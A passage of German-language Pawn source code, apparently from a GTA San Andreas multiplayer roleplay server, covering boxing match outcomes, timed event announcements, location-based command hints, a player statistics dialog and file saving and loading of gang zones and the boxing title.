					                	        new nstring[MAX_PLAYER_NAME];
												format(nstring, sizeof(nstring), "%s", titel);
												strmid(Titel[TitelName], nstring, 0, strlen(nstring), 255);
					                	        Titel[TitelWins] = PlayerInfo[TBoxer][pWins];
					                	        Titel[TitelLoses] = PlayerInfo[TBoxer][pLoses];
					                	        SaveBoxer();
							                	format(string, sizeof(string), "Boxing News: %s hat den Kampf gegen den Champion %s gewonnen und ist nun der neue Boxing Champion.",  titel, loser);
												OOCOff(COLOR_WHITE,string);
				                	        }
				                	        else
				                	        {
				                	            SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "* Du könntest der Champion sein, wenn es dein Beruf wäre !");
				                	        }
										}
										else
										{
										    GetPlayerName(TBoxer, titel, sizeof(titel));
										    format(string, sizeof(string), "Boxing News: Boxing Champion %s hat den Kampf gegen %s gewonnen.",  titel, loser);
											OOCOff(COLOR_WHITE,string);
											Titel[TitelWins] = PlayerInfo[TBoxer][pWins];
				                	        Titel[TitelLoses] = PlayerInfo[Boxer2][pLoses];
				                	        SaveBoxer();
										}
									}
								}//TBoxer
								format(string, sizeof(string), "* Du hast den Kampf gegen %s verloren.", winner);
								SendClientMessage(Boxer1, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(Boxer1, "~r~Du hast verloren", 3500, 1);
								format(string, sizeof(string), "* Du hast den Kampf gegen %s gewonnen.", loser);
								SendClientMessage(Boxer2, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(Boxer2, "~r~Du hast gewonnen", 3500, 1);
								if(GetPlayerHealth(Boxer1, health) < 20)
								{
								    SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "* Du fühlst dich erschöpft vom Kampf, hol dir was zu Essen.");
								    SetPlayerHealth(Boxer1, 30.0);
								}
								else
								{
								    SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "* Du fühlst dich perfekt, selbst nach dem Kampf.");
								    SetPlayerHealth(Boxer1, 50.0);
								}
								if(GetPlayerHealth(Boxer2, health) < 20)
								{
								    SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "* Du fühlst dich erschöpft vom Kampf, hol dir was zu Essen.");
							    	SetPlayerHealth(Boxer2, 30.0);
								}
								else
								{
								    SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "* Du fühlst dich perfekt, selbst nach dem Kampf.");
								    SetPlayerHealth(Boxer2, 50.0);
								}
                                GameTextForPlayer(Boxer1, "~g~Match vorbei", 5000, 1); GameTextForPlayer(Boxer2, "~g~Match vorbei", 5000, 1);
								if(PlayerInfo[Boxer2][pJob] == 10) { PlayerInfo[Boxer2][pBoxSkill] += 1; }
								PlayerBoxing[Boxer1] = 0;
								PlayerBoxing[Boxer2] = 0;
							}
			            }
			            else if(Lost == 2)
			            {
			                if(IsPlayerConnected(Boxer1) && IsPlayerConnected(Boxer2))
			                {
					        	SetPlayerPos(Boxer1, 765.8433,3.2924,1000.7186); SetPlayerPos(Boxer2, 765.8433,3.2924,1000.7186);
					        	SetPlayerInterior(Boxer1, 5); SetPlayerInterior(Boxer2, 5);
			                	GetPlayerName(Boxer1, winner, sizeof(winner));
			                	GetPlayerName(Boxer2, loser, sizeof(loser));
		                		if(PlayerInfo[Boxer2][pJob] == 10) { PlayerInfo[Boxer2][pLoses] += 1; }
								if(PlayerInfo[Boxer1][pJob] == 10) { PlayerInfo[Boxer1][pWins] += 1; }
			                	if(TBoxer < 255)
			                	{
			                	    if(IsPlayerConnected(TBoxer))
			                	    {
				                	    if(TBoxer != Boxer1)
				                	    {
				                	        if(PlayerInfo[Boxer1][pJob] == 10)
				                	        {
					                	        TBoxer = Boxer1;
					                	        GetPlayerName(TBoxer, titel, sizeof(titel));
					                	        new nstring[MAX_PLAYER_NAME];
												format(nstring, sizeof(nstring), "%s", titel);
												strmid(Titel[TitelName], nstring, 0, strlen(nstring), 255);
					                	        Titel[TitelWins] = PlayerInfo[TBoxer][pWins];
					                	        Titel[TitelLoses] = PlayerInfo[TBoxer][pLoses];
					                	        SaveBoxer();
							                	format(string, sizeof(string), "Boxing News: %s hat den Kampf gegen den Champion %s gewonnen und ist nun der neue Boxing Champion.",  titel, loser);
												OOCOff(COLOR_WHITE,string);
											}
				                	        else
				                	        {
				                	            SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "* Du könntest der Champion sein, wenn es dein Beruf wäre !");
				                	        }
										}
										else
										{
										    GetPlayerName(TBoxer, titel, sizeof(titel));
										    format(string, sizeof(string), "Du könntest der Champion sein, wenn es dein Beruf wäre !",  titel, loser);
											OOCOff(COLOR_WHITE,string);
											Titel[TitelWins] = PlayerInfo[TBoxer][pWins];
				                	        Titel[TitelLoses] = PlayerInfo[Boxer1][pLoses];
				                	        SaveBoxer();
										}
									}
								}//TBoxer
								format(string, sizeof(string), "* Du hast den Kampf gegen %s verloren.", winner);
								SendClientMessage(Boxer2, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(Boxer2, "~r~Du hast verloren", 3500, 1);
								format(string, sizeof(string), "* Du hast den Kampf gegen %s gewonnen.", loser);
								SendClientMessage(Boxer1, COLOR_LIGHTBLUE, string);
								GameTextForPlayer(Boxer1, "~g~Du hast gewonnen", 3500, 1);
								if(GetPlayerHealth(Boxer1, health) < 20)
								{
								    SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "* Du fühlst dich erschöpft vom Kampf, hol dir was zu Essen.");
								    SetPlayerHealth(Boxer1, 30.0);
								}
								else
								{
								    SendClientMessage(Boxer1, COLOR_LIGHTBLUE, "* Du fühlst dich perfekt, selbst nach dem Kampf.");
								    SetPlayerHealth(Boxer1, 50.0);
								}
								if(GetPlayerHealth(Boxer2, health) < 20)
								{
								    SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "* Du fühlst dich erschöpft vom Kampf, hol dir was zu Essen.");
							    	SetPlayerHealth(Boxer2, 30.0);
								}
								else
								{
								    SendClientMessage(Boxer2, COLOR_LIGHTBLUE, "* Du fühlst dich perfekt, selbst nach dem Kampf.");
								    SetPlayerHealth(Boxer2, 50.0);
								}
                                GameTextForPlayer(Boxer1, "~g~Match vorbei", 5000, 1); GameTextForPlayer(Boxer2, "~g~Match vorbei", 5000, 1);
								if(PlayerInfo[Boxer1][pJob] == 10) { PlayerInfo[Boxer1][pBoxSkill] += 1; }
								PlayerBoxing[Boxer1] = 0;
								PlayerBoxing[Boxer2] = 0;
							}
			            }
			            InRing = 0;
			            RoundStarted = 0;
			            Boxer1 = 255;
			            Boxer2 = 255;
			            TBoxer = 255;
			            trigger = 0;
			        }
			    }
			}
*/
			if(StartingPaintballRound == 1 && AnnouncedPaintballRound == 0)
			{
			    AnnouncedPaintballRound = 1;
			    if(PlayerPaintballing[i] != 0)
			    {
			        SendClientMessage(i, COLOR_YELLOW, "Paintball Match wird angekündigt in 15 Sekunden (für mehr Paintball Spieler)");
			    }
			}
			if(StartingKartRound == 1 && AnnouncedKartRound == 0)
			{
			    AnnouncedKartRound = 1;
			    if(PlayerKarting[i] != 0 && PlayerInKart[i] != 0)
			    {
			        SendClientMessage(i, COLOR_YELLOW, "Karting Race wird angekündigt in 15 Sekunden (für mehr Kart Racers).");
			    }
			}
			if(EndingKartRound == 1)
			{
			    if(PlayerKarting[i] != 0 && PlayerInKart[i] != 0)
			    {
			        DisablePlayerCheckpoint(i);
			        CP[i] = 0;
			    }
			}
			if(FindTime[i] > 0)
			{
			    if(FindTime[i] == FindTimePoints[i]) { FindTime[i] = 0; FindTimePoints[i] = 0; DisablePlayerCheckpoint(i); PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0); GameTextForPlayer(i, "~r~Red Marker weg", 2500, 1); }
			    else
				{
				    format(string, sizeof(string), "%d", FindTimePoints[i] - FindTime[i]);
					GameTextForPlayer(i, string, 1500, 6);
					FindTime[i] += 1;
				}
			}
			if(TaxiCallTime[i] > 0)
			{
			    if(TaxiAccepted[i] < 999)
			    {
				    if(IsPlayerConnected(TaxiAccepted[i]))
				    {
				        new Float:X,Float:Y,Float:Z;
						GetPlayerPos(TaxiAccepted[i], X, Y, Z);
						SetPlayerCheckpoint(i, X, Y, Z, 5);
				    }
				}
			}
			if(BusCallTime[i] > 0)
			{
			    if(BusAccepted[i] < 999)
			    {
				    if(IsPlayerConnected(BusAccepted[i]))
				    {
				        new Float:X,Float:Y,Float:Z;
						GetPlayerPos(BusAccepted[i], X, Y, Z);
						SetPlayerCheckpoint(i, X, Y, Z, 5);
				    }
				}
			}
			/*if(MechanicCallTime[i] > 0)
			{
			    if(MechanicCallTime[i] == 30) { MechanicCallTime[i] = 0; DisablePlayerCheckpoint(i); PlayerPlaySound(i, 1056, 0.0, 0.0, 0.0); GameTextForPlayer(i, "~r~RedMarker gone", 2500, 1); }
			    else
				{
				    format(string, sizeof(string), "%d", 30 - MechanicCallTime[i]);
					GameTextForPlayer(i, string, 1500, 6);
					MechanicCallTime[i] += 1;
				}
			}*/
			if(Robbed[i] == 1)
			{
			    if(RobbedTime[i] <= 0)
			    {
			        RobbedTime[i] = 0;
					Robbed[i] = 0;
			    }
			    else
			    {
			        RobbedTime[i] -= 1;
			    }
			}
			if(PlayerCuffed[i] == 1)
			{
			    if(PlayerCuffedTime[i] <= 0)
			    {
			        SendClientMessage(i, COLOR_LIGHTBLUE, "* Du hast die Handschellen geknackt und konntest dich entfesseln!");
			        UnFreezePlayer(i);
			        PlayerCuffed[i] = 0;
			        PlayerCuffedTime[i] = 0;
			        PlayerTazeTime[i] = 1;
			    }
			    else
			    {
			        PlayerCuffedTime[i] -= 1;
			    }
			}






			else if(IsPlayerInRangeOfPoint(i,2.0,252.8250,1780.5929,701.0859))
			{
			    GameTextForPlayer(i, "~r~/paper", 5000,1);
			}


//			else if(IsPlayerInRangeOfPoint(i,2.0,1023.1495,-1091.6942,23.8349))
//			{
//			    GameTextForPlayer(i, "~r~/buycar", 5000,1);
//			}
			else if(IsPlayerInRangeOfPoint(i,2.0,1424.1346,-1003.0747,1639.7843))
			{
			    GameTextForPlayer(i, "~r~/bankrob", 5000,1);
			}
			else if(IsPlayerInRangeOfPoint(i,2.0,325.4559,307.0085,999.1484))
			{
			    GameTextForPlayer(i, "~r~/equip", 5000,1);
			}
		    else if(IsPlayerInRangeOfPoint(i,10.0,923.48230, -1216.51563, 18.70460))
			{
				OnPlayerCommandText(i,"/otor1");
			}
			else if(IsPlayerInRangeOfPoint(i,2.0,1364.03,-1266.51,13.55))
			{
			    GameTextForPlayer(i, "~r~/waffenschein", 5000,1);
			}
			else if(IsPlayerInRangeOfPoint(i,2.0,448.4033,-84.3045,999.5547))
			{
			    GameTextForPlayer(i,"~r~/menu!", 5000,3);
			}
			else if(IsPlayerInRangeOfPoint(i,2.0,811.4277,-1616.1138,13.5469))
			{
			    GameTextForPlayer(i, "~w~Benutze die Taste Enter um den Burger Shot zu betreten!", 5000,3);
			}
			else if(IsPlayerInRangeOfPoint(i,2.0,457.304748,-88.428497,999.554687))
			{
			    GameTextForPlayer(i, "~w~Benutze die Taste Enter um den Burger Shot zu verlassen!", 5000,3);
			}

			else if(IsPlayerInRangeOfPoint(i,2.0,1388.7091,-993.8844,5651.8315))
			{
			    GameTextForPlayer(i, "~w~Tippe /aufsprengen um den Tresor zu sprengen!", 5000,3);
			}
			else if(IsPlayerInRangeOfPoint(i,2.0,295.2805,-80.3647,1001.5156))
			{
			    GameTextForPlayer(i, "~w~Tippe /buygun oder /buyarmor um hier einzukaufen!", 5000,3);
			}
			else if(IsPlayerInRangeOfPoint(i,2.0,257.0887,77.0689,1003.6406)) //Enforcer int /ausruesten
			{
			    GameTextForPlayer(i, "~w~ Wenn du dich Ausruesten moechtest gehe zum LSPD spawn ~n~ Tippe /ausruesten ~n~ um in den Dienst zu gehen /duty.", 5000,3);
			}// LSPD
			else if(IsPlayerInRangeOfPoint(i,2.0,217.4228,184.3811,1003.0313)) //Enforcer int /ausruesten
			{
			    GameTextForPlayer(i, "~w~ Wenn du dich Ausruesten moechtest ~n~ Tippe /ausruesten ~n~ um in den Dienst zu gehen /duty", 5000,3);
			}// S.W.A.T
			else if(IsPlayerInRangeOfPoint(i,2.0,227.6692,111.6513,1003.2188)) //Enforcer int /ausruesten
			{
			    GameTextForPlayer(i, "~w~ Wenn du dich Ausruesten moechtest ~n~ Tippe /ausruesten ~n~ um in den Dienst zu gehen /duty", 5000,3);
			}// FBI
			else if(IsPlayerInRangeOfPoint(i,3.0,593.0110,-1248.0918,18.1534)) //LSPD
			{
			    GameTextForPlayer(i, "~w~Hier kannst du mit ~r~/materials get ~w~Materialien bekommen", 5000, 3);
			}
/*
			else if(IsPlayerInRangeOfPoint(i,3.0,1494.3136,1303.5925,1093.2891)) //Feuerwer exit
			{
			    GameTextForPlayer(i, "~w~ Tippe /mexit oder /fexit ", 5000, 3);
			}
*/



			else if(IsPlayerInRangeOfPoint(i,3.0, 358.8627,182.6243,1008.3828)) //drink
			{
			    GameTextForPlayer(i, "~w~ Hier kannst du eine Organisation erstellen ~e~(Befehl: /orgcreate)", 5000, 3);
			}

            else if(IsPlayerInRangeOfPoint(i,5.0, 1971.8423,-2205.5608,13.5469)) //fallschirmspirngen
			{
			    GameTextForPlayer(i, "~w~ Hier kannst du Falschirm springen ~e~(Befehl: /fallschirmspringen)", 5000, 3);
			}


			else if(IsPlayerInRangeOfPoint(i,3.0, 499.4521,-20.6484,1000.6797)) //drink
			{
			    GameTextForPlayer(i, "~w~ Hier kannst du Drinks bestellen ~e~(Befehl: /drink)", 5000, 3);
			}
			else if(IsPlayerInRangeOfPoint(i,3.0, 490.8359,-14.0423,1000.6797)) //dance
			{
			    GameTextForPlayer(i, "~w~ Lust zu tanzen? Tippe ~e~/dance", 5000, 3);
			}
			else if(IsPlayerInRangeOfPoint(i,3.0,1008.7658,-2303.2424,13.3025)) ///menter
			{
			    GameTextForPlayer(i, "~w~ Um das Haus zu betreten ~n~ ~r~ Tippe /menter ", 5000, 3);
			}
			else if(IsPlayerInRangeOfPoint(i,2.0,593.0110,-1248.0918,18.1534)) //Materials Paket-Hol-Punkt
			{
			    GameTextForPlayer(i, "~g~Materials-Pakete~n~~y~Du kannst hier ~r~Materials-Pakete~y~ abholen ~n~~w~Benutze /materials get [Anzahl]", 5000, 3);
			}
			else if(IsPlayerInRangeOfPoint(i,2.0,-2109.4983,0.7033,35.3203)) //Materials Paket-Hinbring-Punkt
			{
			    GameTextForPlayer(i, "~g~Materials-Fabrik~n~~y~Du kannst hier Materials-Pakete gegen ~r~Materials~y~ eintauschen~n~~w~Benutze /materials deliver", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0, -85.4636,2.1646,3.1172))
			{
			    GameTextForPlayer(i, "~w~Benutze ~y~/get drugs~w~ um Drogen zu bekommen~n~~w~Benutze ~y~/drogenlager~w~ um zu sehen wie viel vorhanden ist", 5000, 3);
			}
		 	else if (IsPlayerInRangeOfPoint(i,3.0,-49.7952,-269.3755,6.6332))
			{
			    GameTextForPlayer(i, "~y~Wilkommen bei der ~r~Transport GmbH ~g~", 5000, 5);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,1494.3601,1304.2662,1093.2891))
			{
			    GameTextForPlayer(i, "~w~/duty", 5000, 3);
			}
			else if(AtATM(i))
			{
			    GameTextForPlayer(i, "~r~Bankautomat~g~ Benutzung: /atm", 9000, 5);
			}
			else if (IsPlayerInRangeOfPoint(i,3.0,496.4293,-75.6149,998.7578))
			{
			    GameTextForPlayer(i, "~w~ Bar ~n~ Tippe /drink", 5000,3);
			}
			else if (IsPlayerInRangeOfPoint(i,3.0,201.8244,1865.1124,13.1406))
			{
			    GameTextForPlayer(i, "~g~Bundeswehr ~r~/bwequip", 5000, 3);
			}
			else if(IsPlayerInRangeOfPoint(i,2.0,1924.3221,959.9957,10.8203))
			{
			    GameTextForPlayer(i, "~e~Yakuza Base~w~", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,2324.1921,-1148.9674,1050.7101))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten.", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,1712.4611,-1640.0770,20.2239))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten.", 5000, 3);
			}
			else if(IsPlayerInRangeOfPoint(i,5.0,2864.7419,1014.5103,10.7548))
			{
			    GameTextForPlayer(i, "~r~S W A T Base! /ausruesten", 5000,3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,2548.8997,-1294.7299,1060.9844))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,-2636.7234,1403.0695,906.4609))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,1701.1711,-1667.7778,20.2188))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,2018.5990,1017.7141,996.8750))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,2496.0439,-1692.5247,1014))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,-2109.4690,0.5970,35.3203))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,318.5725,1114.9063,1083.8828))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,318.6431,1114.9161,1083.8828))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,140.3315,1366.7438,1083.8594))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,1939.4677,982.8486,992.4688))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
			}
//			else if(IsPlayerInRangeOfPoint(i,2.0,2819.4785,-1169.4138,1025.5703) && GetPlayerVirtualWorld(i) != 3)
//			{
//			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
//			}
			else if (IsPlayerInRangeOfPoint(i,2.0,234.1882,1064.2736,1084.2114))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,1277.5029,-808.4862,1089.9375))
			{
			    GameTextForPlayer(i, "~e~Fraktionskammer ~w~Tippe /ausruesten", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,2495.3865,-1690.6353,14.7656))
			{
			    GameTextForPlayer(i, "~w~Grove Base Enter, um sie zu betreten", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,206.6770,-135.4380,1002.8744))
			{
			    GameTextForPlayer(i, "~w~Wenn du deine Kleidung wechseln möchtest~n~ benutze ~r~/clothes", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,2495.4258,-1690.8638,14.7656))
			{
			    GameTextForPlayer(i, "~w~Grove Street Base", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,-2529.0854,-19.1742,16.4219))
			{
			    GameTextForPlayer(i, "~w~SF Rifa Base", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,2462.4351,80.6730,26.4564))
			{
			    GameTextForPlayer(i, "~w~Hitman Base", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,2786.4897,-1926.2115,13.5469))
			{
			    GameTextForPlayer(i, "~w~Aztecas Base", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,-2810.0015,-1524.0463,140.8438))
			{
				GameTextForPlayer(i, "~r~/gangjail, um Spieler einzusperren\n /gangunjail um jemanden zu befreien",5000,3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,1214.6090,-1638.8822,11.7969))
			{
			    GameTextForPlayer(i, "~w~Red Soldier Base", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,2.0,-516.1633,-506.0980,25.5234))
			{
			    GameTextForPlayer(i, "~w~Wheelman Base", 5000, 3);
			}

			else if (IsPlayerInRangeOfPoint(i,3.0, 1835.9020,-1682.5295,13.3704))
			{
			    GameTextForPlayer(i, "~w~Benutze die Entertaste um Alahmbra zu betreten!", 5000, 3);
			}
			else if (IsPlayerInRangeOfPoint(i,3.0, 493.390991,-22.722799,1000.679687))
			{
				GameTextForPlayer(i, "~w~Benutze die Entertaste um Alahmbra zu verlassen!", 5000, 3);
			}

		}
	}
	return 1;
}
Function Stats(playerid,targetid)
{
    if(IsPlayerConnected(targetid))
	{
		new cash =  GetPlayerMoneySave(targetid);
		new atext[20];
		if(PlayerInfo[targetid][pSex] == 1) { atext = "Männlich"; }
		else if(PlayerInfo[targetid][pSex] == 2) { atext = "Weiblich"; }
		new ttext[20];
		new leader = PlayerInfo[targetid][pLeader];
		new member = PlayerInfo[targetid][pMember];
		if(gTeam[targetid] == 3 || gTeam[targetid] == 4) { ttext = "Zivilist"; }
		else
		{
		    if(leader != 0) ttext = Fracs[leader-1];
		    if(member != 0) ttext = Fracs[member-1];
		}
		new dtext[20];
		if(STDPlayer[targetid] == 1) { dtext = "Chlamydia"; }
		else if(STDPlayer[targetid] == 2) { dtext = "Gonorrhea"; }
		else if(STDPlayer[targetid] == 3) { dtext = "Syphilis"; }
		else { dtext = "-"; }
        new jtext[20];
        if(PlayerInfo[targetid][pJob] == 1) { jtext = "Detektiv"; }
        else if(PlayerInfo[targetid][pJob] == 2) { jtext = "Anwalt"; }
        else if(PlayerInfo[targetid][pJob] == 3) { jtext = "Zugfahrer"; }
        else if(PlayerInfo[targetid][pJob] == 4) { jtext = "Drogendealer"; }
        else if(PlayerInfo[targetid][pJob] == 5) { jtext = "Autodieb"; }
        else if(PlayerInfo[targetid][pJob] == 6) { jtext = "Farmer"; }
        //else if(PlayerInfo[targetid][pJob] == 7) { jtext = "Mechaniker"; }
        else if(PlayerInfo[targetid][pJob] == 8) { jtext = "Bodyguard"; }
        else if(PlayerInfo[targetid][pJob] == 9) { jtext = "Waffendealer"; }
        else if(PlayerInfo[targetid][pJob] == 10) { jtext = "Pilot"; }
		else if(PlayerInfo[targetid][pJob] == 12) { jtext = "Boxer"; }
        else if(PlayerInfo[targetid][pJob] == 14) { jtext = "Busfahrer"; }
        else if(PlayerInfo[targetid][pJob] == 15) { jtext = "Zeitungsjunge"; }
        else if(PlayerInfo[targetid][pJob] == 16) { jtext = "Pilot"; }
        else if(PlayerInfo[targetid][pJob] == 17) { jtext = "Müllmann"; }
        else if(PlayerInfo[targetid][pJob] == 18) { jtext = "Angler"; }
        else if(PlayerInfo[targetid][pJob] == 19) { jtext = "Pizzalieferer"; }
        else if(PlayerInfo[targetid][pJob] == 21) { jtext = "Busfahrer"; }

     //   else if(PlayerInfo[targetid][pJob] == 22) { jtext = "Mechaniker(Lizensiert)"; }

        else { jtext = "-"; }
		new drank[20];
		if(PlayerInfo[targetid][pDonateRank] >= 1)
		{
		drank = "Vorhanden";
		}
		else
		{
		drank = "-";
		}
  		new married[20];
		strmid(married, PlayerInfo[targetid][pMarriedTo], 0, strlen(PlayerInfo[targetid][pMarriedTo]), 255);
		new verreckt = PlayerInfo[targetid][pVerreckt];
		new crimes = PlayerInfo[targetid][pCrimes];
		new arrests = PlayerInfo[targetid][pKills];
 		new boxdrugs = PlayerInfo[targetid][pBoxDrugs];
		new boxmats = PlayerInfo[targetid][pBoxMats];
		new fraksperre = PlayerInfo[targetid][pFrakSperre];
		new wanted = WantedLevel[targetid];
		new level = PlayerInfo[targetid][pLevel];
		new exp = PlayerInfo[targetid][pExp];
		new zollt = PlayerInfo[targetid][pZollPassTime];
        new warns = PlayerInfo[targetid][pWarns];
		new drugs = PlayerInfo[targetid][pDrugs];
		new pkredit = PlayerInfo[targetid][pPlayerKredit];
		new mats = PlayerInfo[targetid][pMats];
		new pnumber = PlayerInfo[targetid][pPnumber];
		new account = PlayerInfo[targetid][pAccount];
		new pkreditdauer = PlayerInfo[targetid][pPlayerKreditDauer];
		new nxtlevel = PlayerInfo[targetid][pLevel]+1;
		new expamount = nxtlevel*levelexp;
		new Float:shealth = PlayerInfo[targetid][pSHealth];
		new Float:health;
		new name[MAX_PLAYER_NAME];
		GetPlayerName(targetid, name, sizeof(name));
		GetPlayerHealth(targetid,health);
		new Float:px,Float:py,Float:pz;
		new Float:plHealth, Float:plArmour;
		new ToPayDay = PlayerInfo[targetid][pPlayMinutes];
		new TimeToPayday = ToPayDay ;//-= 60
		GetPlayerPos(targetid, px, py, pz);
		GetPlayerHealth(targetid,plHealth);
		GetPlayerArmour(targetid,plArmour);


		new succes[512];


		new istinorg = PlayerInfo[targetid][pOrgRang];

//		new ficken = PlayerInfo[targetid][pOrgMember];

		if(istinorg == 0)
		{
			succes = "Keine";
		}
		else if(istinorg > 1)
		{
//			PlayerInfo[targetid][pOrgName] = succes[511];
		}

		new string1[200],string2[500],string3[400],string4[200],string5[200],string6[200],string7[200],string8[500],string9[200],string10[200],string11[200],string12[500],string13[27],rest[1500];
		format(string1, sizeof string1, "Name: %s \nAlter: %d", name,PlayerInfo[targetid][pAge]);
		format(string2, sizeof string2, "Allgemeines");
		format(string3, sizeof string3, "Level: %d \nSpawnenergie: %.1f \nVerheiratet mit: %s \nTelefonnummer: %d \n", level,shealth+50.0,married,pnumber);
		format(string6, sizeof string4, "Verwarnungen: %d \nVerbrechen: %d \nMorde: %d\nGestorben: %d \nSpielminuten seit Login / insgesammt: %d / %d ", warns,crimes,arrests,verreckt,PlayerInfo[targetid][pMinutesSinceLogin],PlayerInfo[targetid][pGesamtMinutes]);
		format(string8, sizeof string5, "Bargeld: %d$ \nBankkonto: %d$ \nPremium: %s \nWantedlevel: %d\nRespektpunkte: %d / %d\nKreditraten verbleibend / Summe: %d / %d\nDrogen: %d g\nMaterialien: %d \nZollpass seit: %d", cash,account, drank, wanted,exp,expamount,pkreditdauer,pkredit,drugs,mats,zollt);
		format(string10, sizeof string6, "Savebox Materialen: %d \nSavebox Drogen: %d g", boxmats, boxdrugs);
 		format(string12, sizeof string7, "Fraktion: %s \nRang: %s\nOrganisation: %s \nJob: %s \nGehalt/Payday: %d $ in %d/60 Minuten\nFraktionsperre: %d Stunden", ttext,GetFrakRang(PlayerInfo[targetid][pRank],PlayerInfo[targetid][sMember]),succes,jtext,PlayerInfo[targetid][pGehalt],TimeToPayday,fraksperre/3600);
		format(rest, sizeof rest, "%s\n\n\n%s\n%s\n%s\n%s\n\n%s\n%s\n%s\n\n%s\n%s\n\n%s\n%s\n%s\n%s", string1,string2,string3,string4,string5,string6,string7,string8,string9,string10,string11,string12,string13);
		ShowPlayerDialog(playerid,DIALOG_STATS,DIALOG_STYLE_MSGBOX,"Statstik",rest,"Beenden","");
	}
}
//------------------------------------------------------------------------------------------------------

Function SaveGangZones()
{
	new idx;
	new File: file2;
	while (idx < GangZones_Index)
	{
		new coordsstring[256];
		format(coordsstring, sizeof(coordsstring), "%f,%f,%f,%f,%f,%f,%f,%d\n",
		GangZones[idx][x1],
		GangZones[idx][y1],
		GangZones[idx][x2],
		GangZones[idx][y2],
		GangZones[idx][ix],
		GangZones[idx][iy],
		GangZones[idx][iz],
		GangZones[idx][owner]);
		if(idx == 0)
		{
			file2 = fopen("gangzones.cfg", io_write);
		}
		else
		{
			file2 = fopen("gangzones.cfg", io_append);
		}
		fwrite(file2, coordsstring);
		idx++;
		fclose(file2);
	}
}
Function LoadGangZones()
{
	new arrCoords[8][64];
	new strFromFile2[256];
	new File: file = fopen("gangzones.cfg", io_read);
	if (file)
	{
		new idx;
		while (idx < GangZones_Index)
		{
			fread(file, strFromFile2);
			split2(strFromFile2, arrCoords, ',');
			GangZones[idx][x1] = floatstr(arrCoords[0]);
			GangZones[idx][y1] = floatstr(arrCoords[1]);
			GangZones[idx][x2] = floatstr(arrCoords[2]);
			GangZones[idx][y2] = floatstr(arrCoords[3]);
			GangZones[idx][ix] = floatstr(arrCoords[4]);
			GangZones[idx][iy] = floatstr(arrCoords[5]);
			GangZones[idx][iz] = floatstr(arrCoords[6]);
			GangZones[idx][owner] = strval(arrCoords[7]);
			printf("GangZone %d loadad: %f,%f,%f,%f,%f,%f,%f,%d",idx,
			GangZones[idx][x1],
			GangZones[idx][y1],
			GangZones[idx][x2],
			GangZones[idx][y2],
			GangZones[idx][ix],
			GangZones[idx][iy],
			GangZones[idx][iz],
			GangZones[idx][owner]);
			idx++;
		}
		fclose(file);
	}
	return 1;
}
Function LoadBoxer()
{
	new arrCoords[3][64];
	new strFromFile2[256];
	new File: file = fopen("boxer.ini", io_read);
	if (file)
	{
		fread(file, strFromFile2);
		split2(strFromFile2, arrCoords, ',');
		Titel[TitelWins] = strval(arrCoords[0]);
		strmid(Titel[TitelName], arrCoords[1], 0, strlen(arrCoords[1]), 255);
		Titel[TitelLoses] = strval(arrCoords[2]);
		fclose(file);
	}
	return 1;
}

Function SaveBoxer()
{
	new coordsstring[256];
	format(coordsstring, sizeof(coordsstring), "%d,%s,%d", Titel[TitelWins],Titel[TitelName],Titel[TitelLoses]);
